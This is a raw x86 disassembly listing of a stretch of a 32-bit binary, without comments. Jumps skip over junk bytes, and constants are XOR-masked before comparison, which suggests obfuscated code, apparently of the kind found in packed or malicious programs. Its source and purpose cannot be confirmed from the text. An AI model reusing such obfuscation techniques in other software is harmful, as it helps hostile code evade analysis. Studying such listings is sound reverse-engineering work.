  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bh,BYTE PTR [ebp+ecx*4-0x3]
  40ebb6:	enter  0xa59a,0x7e
  40ebba:	jle    0x40ec10
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb4b
  40ebc0:	stc    
  40ebc1:	push   eax
  40ebc2:	xchg   esp,eax
  40ebc3:	lahf   
  40ebc4:	data16 fiadd DWORD PTR [ebx-0x27de307]
  40ebcb:	retf   
  40ebcc:	xor    BYTE PTR es:[edi+0x17],bl
  40ebd0:	shl    BYTE PTR [ecx+0x1a],cl
  40ebd3:	int3   
  40ebd4:	or     edi,DWORD PTR [eax-0x5786d6ab]
  40ebda:	jo     0x40ebb0
  40ebdc:	sub    BYTE PTR [edx],ah
  40ebde:	das    
  40ebdf:	es jo  0x40ebe8
  40ebe2:	add    DWORD PTR [esi+eax*1-0x30],edx
  40ebe6:	push   esi
  40ebe7:	xchg   esp,eax
  40ebe8:	dec    ebp
  40ebe9:	jne    0x40ebf6
  40ebeb:	out    0xde,eax
  40ebed:	or     ecx,DWORD PTR [edx-0x34]
  40ebf0:	jbe    0x40ec60
  40ebf2:	cmp    BYTE PTR [edx],bl
  40ebf4:	mov    bh,0x3c
  40ebf6:	into   
  40ebf7:	dec    esi
  40ebf8:	int3   
  40ebf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebfa:	not    DWORD PTR [eax+edx*2]
  40ebfd:	fidiv  DWORD PTR [edi+0x52e2df02]
  40ec03:	aaa    
  40ec04:	or     DWORD PTR [edi],edi
  40ec06:	adc    BYTE PTR [eax],0x13
  40ec09:	pop    edi
  40ec0a:	pop    ebx
  40ec0b:	cli    
  40ec0c:	push   esi
  40ec0d:	jg     0x40ebaa
  40ec0f:	mov    ebx,0x244644dc
  40ec14:	out    0x1a,al
  40ec16:	sti    
  40ec17:	int    0x2a
  40ec19:	nop
  40ec1a:	jge    0x40ebed
  40ec1c:	(bad)  
  40ec1d:	hlt    
  40ec1e:	imul   esp,DWORD PTR [ebx],0x9e93eb05
  40ec24:	outs   dx,BYTE PTR ds:[esi]
  40ec25:	pop    ss
  40ec26:	scas   al,BYTE PTR es:[edi]
  40ec27:	popf   
  40ec28:	sub    al,0x9a
  40ec2a:	xor    esi,DWORD PTR [eax+0x2909ecdf]
  40ec30:	xor    dl,BYTE PTR [ebp+edi*8-0x6ea0d771]
  40ec37:	into   
  40ec38:	or     BYTE PTR [esi],dh
  40ec3a:	xchg   ecx,eax
  40ec3b:	sub    eax,0x54f68ae0
  40ec40:	sar    BYTE PTR [edx-0x49b56d4e],0x76
  40ec47:	push   esi
  40ec48:	xor    esp,esi
  40ec4a:	mov    eax,ds:0x9370fcd5
  40ec4f:	int    0x6d
  40ec51:	mov    esi,0x5648780f
  40ec56:	shl    DWORD PTR [ebx+0x442c13ed],0x61
  40ec5d:	aas    
  40ec5e:	add    DWORD PTR [edx+0x465110b9],edx
  40ec64:	push   0x24
  40ec66:	into   
  40ec67:	test   eax,0xbf97165b
  40ec6c:	in     eax,dx
  40ec6d:	sub    ch,BYTE PTR [edi-0x25]
  40ec70:	pop    edx
  40ec71:	xor    eax,DWORD PTR [ebp+0xc]
  40ec74:	pop    ebx
  40ec75:	jno    0x40ebfb
  40ec77:	adc    bh,BYTE PTR [esi+0x13730f4f]
  40ec7d:	adc    bl,cl
  40ec7f:	cmp    BYTE PTR [eax],al
  40ec81:	int    0xf9
  40ec83:	bound  eax,QWORD PTR [edi+0x64]
  40ec86:	bound  ebp,QWORD PTR [ebx]
  40ec88:	int    0xb7
  40ec8a:	js     0x40ec9b
  40ec8c:	in     eax,0xff
  40ec8e:	test   eax,0xf4e6d0f2
  40ec93:	in     al,dx
  40ec94:	add    al,0x1f
  40ec96:	(bad)  
  40ec97:	loop   0x40ecf9
  40ec99:	fdivr  QWORD PTR [ebx+0x76268f42]
  40ec9f:	clc    
  40eca0:	mov    dl,0xb5
  40eca2:	sub    ah,BYTE PTR [ecx+0x46]
  40eca5:	jge    0x40ec76
  40eca7:	mov    ebx,0xc40ce35f
  40ecac:	popa   
  40ecad:	in     eax,0xc6
  40ecaf:	and    eax,0x1c27a87b
  40ecb4:	cld    
  40ecb5:	mov    ebp,0x28938766
  40ecba:	jmp    0x93a09054
  40ecbf:	(bad)  
  40ecc0:	idiv   DWORD PTR [edi+0x6b8f8063]
  40ecc6:	sbb    al,BYTE PTR [ebp+0x7b]
  40ecc9:	mov    BYTE PTR [eax],al
  40eccb:	push   0x7c
  40eccd:	push   0x3
  40eccf:	cmp    eax,0x3e8a594b
  40ecd4:	add    ebp,DWORD PTR [esi]
  40ecd6:	out    0x47,al
  40ecd8:	pusha  
  40ecd9:	push   ebx
  40ecda:	and    ah,BYTE PTR [ebx+edi*1]
  40ecdd:	lea    ecx,[eax]
  40ecdf:	add    edx,DWORD PTR [edi]
  40ece1:	sub    BYTE PTR [ebx],bl
  40ece3:	mov    ch,0xdd
  40ece5:	mov    DWORD PTR [eax],esi
  40ece7:	xchg   edx,eax
  40ece8:	cmp    BYTE PTR [esi],dl
  40ecea:	std    
  40eceb:	or     al,0x54
  40eced:	pop    ebx
  40ecee:	add    eax,0x910c04e6
  40ecf3:	nop
  40ecf4:	mov    ds:0x32cb3e94,eax
  40ecf9:	jge    0x40ec7e
  40ecfb:	mov    dl,0x1e
  40ecfd:	popf   
  40ecfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecff:	ds xchg ecx,eax
  40ed01:	in     al,0xa1
  40ed03:	cli    
  40ed04:	or     esi,ebp
  40ed06:	cmp    cl,BYTE PTR [edx+0xc]
  40ed09:	push   ds
  40ed0a:	lods   al,BYTE PTR ds:[esi]
  40ed0b:	sbb    eax,0x7fcc443
  40ed10:	aas    
  40ed11:	add    eax,0xb520fa1c
  40ed16:	test   al,0xdc
  40ed18:	mov    dh,0xcf
  40ed1a:	repnz aaa 
  40ed1c:	(bad)  
  40ed1d:	into   
  40ed1e:	mov    ah,0xea
  40ed20:	cmp    eax,0xcb773099
  40ed25:	sbb    eax,0x4fc41b14
  40ed2a:	aas    
  40ed2b:	push   esi
  40ed2c:	inc    esi
  40ed2d:	push   eax
  40ed2e:	jmp    0x40ed46
  40ed30:	shr    BYTE PTR [esi],cl
  40ed32:	ja     0x40ed30
  40ed34:	(bad)  
  40ed35:	and    eax,0xfcca765e
  40ed3a:	test   al,0x89
  40ed3c:	cdq    
  40ed3d:	xor    DWORD PTR [ecx+0x6c],ebp
  40ed40:	das    
  40ed41:	cmp    BYTE PTR [ecx-0x34cc3b1],bl
  40ed47:	jbe    0x40ed60
  40ed49:	add    ah,0xc1
  40ed4c:	cmp    ebp,DWORD PTR ds:0xaf4e568f
  40ed52:	fdiv   DWORD PTR [ebp-0x3beba467]
  40ed58:	inc    ebx
  40ed59:	inc    edx
  40ed5a:	fbstp  TBYTE PTR [edi-0x7f2ac977]
  40ed60:	ror    esp,0x82
  40ed63:	adc    BYTE PTR [ecx+eiz*1+0x71],cl
  40ed67:	push   edi
  40ed68:	jp     0x40ed30
  40ed6a:	jmp    0x40ed60
  40ed6c:	fwait
  40ed6d:	int3   
  40ed6e:	mov    ah,0x84
  40ed70:	outs   dx,BYTE PTR ds:[esi]
  40ed71:	cli    
  40ed72:	(bad)  
  40ed73:	inc    ebx
  40ed74:	inc    ebx
  40ed75:	cmc    
  40ed76:	jne    0x40ed7a
  40ed78:	and    DWORD PTR [edi],ecx
  40ed7a:	daa    
  40ed7b:	ret    
  40ed7c:	sti    
  40ed7d:	aam    0x8
  40ed7f:	mov    cl,0xc1
  40ed81:	jg     0x40edd3
  40ed83:	aaa    
  40ed84:	mov    al,0x46
  40ed86:	out    0xa4,al
  40ed88:	cmp    DWORD PTR gs:[edi+0x5c],edx
  40ed8c:	retf   
  40ed8d:	jns    0x40ed61
  40ed8f:	addr16 jnp 0x40ed68
  40ed92:	adc    al,0xd5
  40ed94:	jl     0x40eda8
  40ed96:	outs   dx,DWORD PTR ds:[esi]
  40ed97:	dec    eax
  40ed98:	das    
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x4337d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x6892b4a1]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	rcr    BYTE PTR [eax-0x2e],0xe5
  40ee7a:	popa   
  40ee7b:	dec    eax
  40ee7c:	xor    bh,al
  40ee7e:	bndldx bnd3,[ecx-0x16]
  40ee82:	loope  0x40ee5d
  40ee84:	(bad)  
  40ee85:	int    0xc8
  40ee87:	push   ss
  40ee88:	push   esi
  40ee89:	dec    edx
  40ee8a:	mov    edi,0x62cff00c
  40ee8f:	jecxz  0x40ee52
  40ee91:	or     DWORD PTR [esi-0x7537b3b0],0x66
  40ee98:	fwait
  40ee99:	mov    ds:0xd11d71d7,eax
  40ee9e:	cld    
  40ee9f:	pop    ebx
  40eea0:	imul   ebx,DWORD PTR [ebx-0x783df0ac],0xad37407
  40eeaa:	or     al,0xe4
  40eeac:	outs   dx,BYTE PTR ds:[esi]
  40eead:	cli    
  40eeae:	inc    esi
  40eeaf:	jp     0x40eeab
  40eeb1:	sti    
  40eeb2:	mov    dl,0xf8
  40eeb4:	mov    bh,0xc6
  40eeb6:	imul   eax,DWORD PTR [edx],0xe17a6145
  40eebc:	xchg   BYTE PTR [ecx],cl
  40eebe:	sub    eax,DWORD PTR [edx-0x36]
  40eec1:	sbb    BYTE PTR [esi],0xb7
  40eec4:	stos   BYTE PTR es:[edi],al
  40eec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eec6:	popf   
  40eec7:	outs   dx,DWORD PTR ds:[esi]
  40eec8:	pop    ss
  40eec9:	push   esp
  40eeca:	push   ebp
  40eecb:	dec    ecx
  40eecc:	sbb    edi,DWORD PTR [edi-0x5c]
  40eecf:	dec    ebx
  40eed0:	popf   
  40eed1:	push   0x5133bc2e
  40eed6:	mov    ebx,0x2f90bbad
  40eedb:	adc    ecx,DWORD PTR [ebx+0x70e5d56a]
  40eee1:	not    DWORD PTR [esp+ebp*8]
  40eee4:	leave  
  40eee5:	pop    ss
  40eee6:	mov    ecx,0xf0c67f2a
  40eeeb:	ja     0x40ef06
  40eeed:	dec    ebx
  40eeee:	hlt    
  40eeef:	pushf  
  40eef0:	retf   0x25e
  40eef3:	xchg   esp,eax
  40eef4:	dec    ecx
  40eef5:	loopne 0x40ef22
  40eef7:	dec    ecx
  40eef8:	and    ebp,DWORD PTR [esp+ecx*1+0x2913ae8]
  40eeff:	pop    ecx
  40ef00:	faddp  st(5),st
  40ef02:	sub    eax,0x91cb4222
  40ef07:	pop    ebx
  40ef08:	lods   eax,DWORD PTR ds:[esi]
  40ef09:	in     eax,dx
  40ef0a:	fistp  QWORD PTR [ecx+0x67d5fd39]
  40ef10:	test   edx,esi
  40ef12:	cmc    
  40ef13:	call   0xcad4:0xfe9a84e7
  40ef1a:	mov    WORD PTR ds:[ecx],ss
  40ef1d:	sub    BYTE PTR [edx+0x1f4ad6b9],0xe3
  40ef24:	push   cs
  40ef25:	leave  
  40ef26:	pop    ecx
  40ef27:	dec    esp
  40ef28:	or     cl,bl
  40ef2a:	or     eax,0x243b3bf
  40ef2f:	(bad)  
  40ef31:	in     al,0x20
  40ef33:	push   ds
  40ef34:	(bad)  
  40ef35:	in     al,dx
  40ef36:	mov    dh,0xa2
  40ef38:	mov    dl,0x80
  40ef3a:	or     al,0x28
  40ef3c:	mov    bh,0x88
  40ef3e:	xchg   esi,eax
  40ef3f:	test   al,0x61
  40ef41:	mov    ebp,0x37781ca8
  40ef46:	mov    ebx,0x6181bf1c
  40ef4b:	inc    ebp
  40ef4c:	xor    ecx,ebx
  40ef4e:	addr16 clc 
  40ef50:	cmp    DWORD PTR [eax-0xaaa7729],ecx
  40ef56:	scas   eax,DWORD PTR es:[edi]
  40ef57:	adc    eax,0xf16b2bd0
  40ef5c:	adc    bh,BYTE PTR [ebp-0x7f9c5ec0]
  40ef62:	inc    ecx
  40ef63:	sub    al,BYTE PTR [edi+ecx*2+0x628a1e41]
  40ef6a:	std    
  40ef6b:	add    al,dh
  40ef6d:	ret    0xd792
  40ef70:	mov    bh,0xe9
  40ef72:	adc    dh,ah
  40ef74:	jmp    0xe71f:0x2c725faa
  40ef7b:	xlat   BYTE PTR ds:[ebx]
  40ef7c:	dec    ecx
  40ef7d:	sbb    BYTE PTR [esi+ecx*8-0x28],dh
  40ef81:	ins    BYTE PTR es:[edi],dx
  40ef82:	shr    DWORD PTR [ecx],1
  40ef84:	mov    bh,BYTE PTR [eax-0x41]
  40ef87:	sbb    DWORD PTR [ebx-0x79],0xb8b19714
  40ef8e:	call   0x9727ef87
  40ef93:	mov    bh,0x37
  40ef95:	xchg   DWORD PTR [esi],edi
  40ef97:	xor    al,ch
  40ef99:	aad    0xad
  40ef9b:	in     eax,dx
  40ef9c:	mov    ebp,0x2ea23134
  40efa1:	dec    esi
  40efa2:	push   ebx
  40efa3:	(bad)  
  40efa4:	out    0x7f,al
  40efa6:	jmp    0x40efb8
  40efa8:	mov    DWORD PTR [ecx-0x229d4e44],esi
  40efae:	inc    edi
  40efaf:	sti    
  40efb0:	rol    BYTE PTR [edx],0xa6
  40efb3:	mov    ds:0x60e3a45d,al
  40efb8:	xor    dh,dl
  40efba:	aas    
  40efbb:	(bad)  
  40efbc:	retf   0xe3c0
  40efbf:	call   esp
  40efc1:	pop    es
  40efc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc3:	sbb    BYTE PTR [esi+ecx*4-0x16],0x4a
  40efc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc9:	ds out dx,eax
  40efcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efcc:	repz inc ecx
  40efce:	sbb    DWORD PTR ds:0x18b69398,edi
  40efd4:	adc    ebx,edx
  40efd6:	stos   DWORD PTR es:[edi],eax
  40efd7:	xchg   esp,eax
  40efd8:	pop    esp
  40efd9:	sbb    BYTE PTR [esi+0x65],ah
  40efdc:	gs cmp eax,0x23e26535
  40efe2:	sub    bh,BYTE PTR [edi]
  40efe4:	mov    ch,0xe7
  40efe6:	sub    BYTE PTR [edi],cl
  40efe8:	in     al,dx
  40efe9:	xlat   BYTE PTR ds:[ebx]
  40efea:	and    al,0x8f
  40efec:	dec    ebx
  40efed:	sbb    BYTE PTR [edi],dl
  40efef:	rcr    DWORD PTR [edx],cl
  40eff1:	ins    DWORD PTR es:[edi],dx
  40eff2:	jmp    0x40f010
  40eff4:	mov    cl,0x53
  40eff6:	inc    esp
  40eff7:	cmp    ebx,edi
  40eff9:	cmp    ebx,0x688fc5a8
  40efff:	cmp    eax,ecx
  40f001:	or     al,0xdd
  40f003:	push   0xa9f67478
  40f008:	mov    eax,0x6a6d6b22
  40f00d:	adc    ch,cl
  40f00f:	cmp    DWORD PTR [ebp-0x6d],0xefa43bff
  40f016:	jecxz  0x40f019
  40f018:	mov    cl,BYTE PTR [ebx+eiz*1]
  40f01b:	xor    bl,BYTE PTR [edx]
  40f01d:	into   
  40f01e:	fld    QWORD PTR [edx-0x17]
  40f021:	mov    esp,0xc00d8874
  40f026:	dec    eax
  40f027:	cmc    
  40f028:	jb     0x40f028
  40f02a:	xchg   edx,eax
  40f02b:	pop    edx
  40f02c:	sub    al,0x41
  40f02e:	jnp    0x40f036
  40f030:	fsub   QWORD PTR [ebp+0x4683e66b]
  40f036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f037:	arpl   WORD PTR [edi],ax
  40f039:	cmp    al,0x6
  40f03b:	xchg   ecx,eax
  40f03c:	sub    al,0x34
  40f03e:	pusha  
  40f03f:	into   
  40f040:	repz shl DWORD PTR [ebx],cl
  40f043:	mov    ds:0xe447ea68,al
  40f048:	or     ch,BYTE PTR [eax-0x3b]
  40f04b:	adc    BYTE PTR [edx+0x50],bl
  40f04e:	mov    bl,0x56
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xb5d1594,ebx
  40f076:	gs cmp dh,dl
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	shr    DWORD PTR [eax+0x5fe34540],cl
  40f086:	pmaxsw mm6,QWORD PTR [edi+ecx*4+0x54]
  40f08b:	xchg   esi,eax
  40f08c:	mov    esi,DWORD PTR [edi-0x44d1b091]
  40f092:	sti    
  40f093:	xchg   esi,eax
  40f094:	retf   
  40f095:	xchg   DWORD PTR [edx],ebp
  40f097:	loope  0x40f0a8
  40f099:	retf   
  40f09a:	xchg   edx,eax
  40f09b:	jnp    0x40f045
  40f09d:	pop    ecx
  40f09e:	fdivr  QWORD PTR [ecx-0x1e]
  40f0a1:	inc    edx
  40f0a2:	ins    BYTE PTR es:[edi],dx
  40f0a3:	mov    al,ds:0x16fca375
  40f0a8:	fstp   TBYTE PTR [ebx-0x4582be25]
  40f0ae:	sar    DWORD PTR [ebp-0x39],1
  40f0b1:	mov    DWORD PTR [ecx],esi
  40f0b3:	outs   dx,DWORD PTR ds:[esi]
  40f0b4:	sbb    BYTE PTR ds:0xd5ae496f,0x68
  40f0bb:	pushf  
  40f0bc:	mov    bh,0x6c
  40f0be:	iret   
  40f0bf:	test   al,0xaf
  40f0c1:	les    edx,FWORD PTR [eax-0x5b]
  40f0c4:	ins    BYTE PTR es:[edi],dx
  40f0c5:	mov    esp,0xb1a379e8
  40f0ca:	test   al,0x81
  40f0cc:	xchg   ebx,eax
  40f0cd:	and    BYTE PTR [ebx+0x2c],bh
  40f0d0:	clc    
  40f0d1:	test   BYTE PTR [edi-0x6ecddecf],ch
  40f0d7:	loopne 0x40f11e
  40f0d9:	data16 jno 0x40f0fd
  40f0dc:	pusha  
  40f0dd:	fnstenv [edx+0x2e919577]
  40f0e3:	push   ss
  40f0e4:	outs   dx,BYTE PTR ds:[esi]
  40f0e5:	ret    0x8628
  40f0e8:	jmp    0x747da61e
  40f0ed:	or     eax,0xf1084491
  40f0f2:	(bad)  
  40f0f3:	popf   
  40f0f4:	js     0x40f144
  40f0f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f7:	es pop ds
  40f0f9:	jge    0x40f0e7
  40f0fb:	xchg   ebx,eax
  40f0fc:	add    eax,0xb79b880
  40f101:	sub    bh,bh
  40f103:	sub    eax,esp
  40f105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f106:	sbb    bh,BYTE PTR [edx]
  40f108:	fist   WORD PTR [esi-0x7f]
  40f10b:	or     BYTE PTR [ebp+0x5c],bl
  40f10e:	js     0x40f0d8
  40f110:	dec    esp
  40f111:	pop    ebp
  40f112:	sbb    eax,0x784edf0c
  40f117:	xchg   esp,eax
  40f118:	lods   eax,DWORD PTR ds:[esi]
  40f119:	inc    edx
  40f11a:	or     BYTE PTR [eax+0x70],0x3e
  40f11e:	push   es
  40f11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f120:	pushf  
  40f121:	cmp    BYTE PTR [ebp+0x30],bh
  40f124:	mov    al,ds:0xdd24f70a
  40f129:	das    
  40f12a:	xor    BYTE PTR [ecx],bh
  40f12c:	mov    DWORD PTR [eax],ecx
  40f12e:	or     al,ah
  40f130:	nop
  40f131:	ror    esp,cl
  40f133:	jg     0x40f173
  40f135:	push   cs
  40f136:	call   0x27fb42aa
  40f13b:	ret    
  40f13c:	mov    eax,0xebdf3eda
  40f141:	push   edi
  40f142:	cmp    al,0xb3
  40f144:	int3   
  40f145:	pop    eax
  40f146:	jo     0x40f16c
  40f148:	mov    ds:0xdcc3ecfd,eax
  40f14d:	mov    ecx,0x5d3940b7
  40f152:	xor    edx,DWORD PTR [edx]
  40f154:	dec    ecx
  40f155:	pop    ss
  40f156:	and    al,0x3c
  40f158:	inc    edi
  40f159:	mov    ah,0x6b
  40f15b:	fcom   DWORD PTR [eax+0x7c]
  40f15e:	mul    dh
  40f160:	add    eax,0xe645c08e
  40f165:	cmp    eax,0x3a95bae4
  40f16a:	sub    al,bl
  40f16c:	loop   0x40f10a
  40f16e:	jae    0x40f0f5
  40f170:	retf   
  40f171:	mov    ds:0x9d633ee6,al
  40f176:	pop    ebp
  40f177:	shl    BYTE PTR [edx-0x43307bc],cl
  40f17d:	cmc    
  40f17e:	dec    esp
  40f17f:	das    
  40f180:	pop    edx
  40f181:	push   es
  40f182:	test   bh,dl
  40f184:	pmaxsw mm5,QWORD PTR [ecx+eax*1+0x5f]
  40f189:	fwait
  40f18a:	xchg   esp,eax
  40f18b:	repnz mov ah,0xdd
  40f18e:	call   0x20cfbfe6
  40f193:	jecxz  0x40f1c7
  40f195:	xchg   DWORD PTR [edi],edi
  40f197:	mov    ebx,0x7b624200
  40f19c:	push   ss
  40f19d:	daa    
  40f19e:	xchg   ecx,eax
  40f19f:	in     eax,0x2e
  40f1a1:	outs   dx,BYTE PTR ds:[esi]
  40f1a2:	or     esp,DWORD PTR ds:0xc9d52e5a
  40f1a8:	lods   al,BYTE PTR ds:[esi]
  40f1a9:	icebp  
  40f1aa:	push   ds
  40f1ab:	out    0x85,eax
  40f1ad:	mov    al,0x51
  40f1af:	pop    edi
  40f1b0:	mov    BYTE PTR [edi+edx*4-0x11e194bc],cl
  40f1b7:	push   esp
  40f1b8:	mov    dl,0x42
  40f1ba:	adc    DWORD PTR [esi+edi*4+0x503b5724],ebp
  40f1c1:	xchg   ebp,eax
  40f1c2:	test   al,0x27
  40f1c4:	xor    dh,BYTE PTR [ebx-0x75]
  40f1c7:	mov    edi,0xf1896d59
  40f1cc:	pop    es
  40f1cd:	inc    esi
  40f1ce:	xchg   ebx,eax
  40f1cf:	retf   
  40f1d0:	outs   dx,DWORD PTR ds:[esi]
  40f1d1:	enter  0x904f,0x90
  40f1d5:	rcr    BYTE PTR [eax+0x74],0xaf
  40f1d9:	scas   al,BYTE PTR es:[edi]
  40f1da:	push   cs
  40f1db:	and    eax,0x1f63c697
  40f1e0:	jle    0x40f205
  40f1e2:	push   ss
  40f1e3:	xchg   esp,eax
  40f1e4:	mov    BYTE PTR [ecx],ch
  40f1e6:	test   ebp,ebp
  40f1e8:	pand   mm7,QWORD PTR [edx]
  40f1eb:	pusha  
  40f1ec:	mov    bl,0x91
  40f1ee:	dec    edx
  40f1ef:	sub    edi,edi
  40f1f1:	jae    0x40f1c0
  40f1f3:	mov    esp,0x92a70b22
  40f1f8:	add    DWORD PTR ds:0x23949549,esi
  40f1fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ff:	mov    ss,WORD PTR [edx-0x11a49c51]
  40f205:	push   ebx
  40f206:	int    0x6f
  40f208:	ja     0x40f27a
  40f20a:	call   0x8e7d:0x6cb8c3a5
  40f211:	cmp    edx,DWORD PTR [ebx]
  40f213:	gs mov cl,0x28
  40f216:	stos   BYTE PTR es:[edi],al
  40f217:	popf   
  40f218:	jmp    0xa7c66ba7
  40f21d:	cwde   
  40f21e:	jecxz  0x40f23a
  40f220:	clc    
  40f221:	sub    eax,0x25cca3a5
  40f226:	cmp    BYTE PTR [esp+ecx*2-0x42],ch
  40f22a:	stos   BYTE PTR es:[edi],al
  40f22b:	jae    0x40f2a4
  40f22d:	mov    dl,0x79
  40f22f:	mov    bl,BYTE PTR [ebx+0x48]
  40f232:	adc    DWORD PTR [edi+0x65227374],ecx
  40f238:	dec    ebp
  40f239:	rcl    ah,0xd8
  40f23c:	dec    esp
  40f23d:	add    DWORD PTR [ebp-0x5f],edi
  40f240:	add    BYTE PTR [esp+edx*4-0x19],bl
  40f244:	mov    al,ds:0xe197f0dd
  40f249:	push   es
  40f24a:	mov    ecx,0x1c4db71c
  40f24f:	cwde   
  40f250:	xor    eax,0xf55b596c
  40f255:	mov    ch,0x10
  40f257:	in     al,dx
  40f258:	xchg   ebp,eax
  40f259:	stos   DWORD PTR es:[edi],eax
  40f25a:	pop    ebx
  40f25b:	ss xchg ebx,eax
  40f25d:	xchg   ecx,eax
  40f25e:	bound  edi,QWORD PTR [ecx-0x2fb40883]
  40f264:	or     eax,0x22310fef
  40f269:	enter  0x84e,0x16
  40f26d:	scas   eax,DWORD PTR es:[edi]
  40f26e:	add    bh,BYTE PTR [ecx+ebp*2-0x39258ad4]
  40f275:	imul   esi,DWORD PTR [ecx+0x1f],0xffffff8e
  40f279:	out    dx,eax
  40f27a:	scas   al,BYTE PTR es:[edi]
  40f27b:	inc    ebp
  40f27c:	js     0x40f2ef
  40f27e:	out    0x19,eax
  40f280:	ins    BYTE PTR es:[edi],dx
  40f281:	xor    eax,0x785317d4
  40f286:	imul   eax,DWORD PTR [ecx],0x47
  40f289:	loope  0x40f295
  40f28b:	inc    eax
  40f28c:	pusha  
  40f28d:	pop    edx
  40f28e:	xchg   BYTE PTR [eax+0x52708fed],ch
  40f294:	dec    ebp
  40f295:	clc    
  40f296:	sbb    eax,0x5220c938
  40f29b:	and    al,0x5a
  40f29d:	outs   dx,BYTE PTR ds:[esi]
  40f29e:	test   DWORD PTR [edi],0x9ce01501
  40f2a4:	pop    ebp
  40f2a5:	push   esi
  40f2a6:	es pop esp
  40f2a8:	sahf   
  40f2a9:	lds    edi,FWORD PTR [ebx+eiz*2+0x6a87174]
  40f2b0:	or     esi,ebx
  40f2b2:	push   eax
  40f2b4:	push   0xffffffc3
  40f2b6:	dec    edx
  40f2b7:	pop    esp
  40f2b8:	jmp    0x9fae:0x1aa93580
  40f2bf:	in     al,dx
  40f2c0:	push   cs
  40f2c1:	jle    0x40f261
  40f2c3:	pop    ebx
  40f2c4:	hlt    
  40f2c5:	loope  0x40f2fc
  40f2c7:	cmp    esp,DWORD PTR [ecx-0x7f]
  40f2ca:	xchg   DWORD PTR [eax-0x4367ada5],ebp
  40f2d0:	dec    esp
  40f2d1:	sub    ebp,DWORD PTR [edx-0x5a25cd80]
  40f2d7:	es iret 
  40f2d9:	pop    es
  40f2da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2db:	xchg   ebp,eax
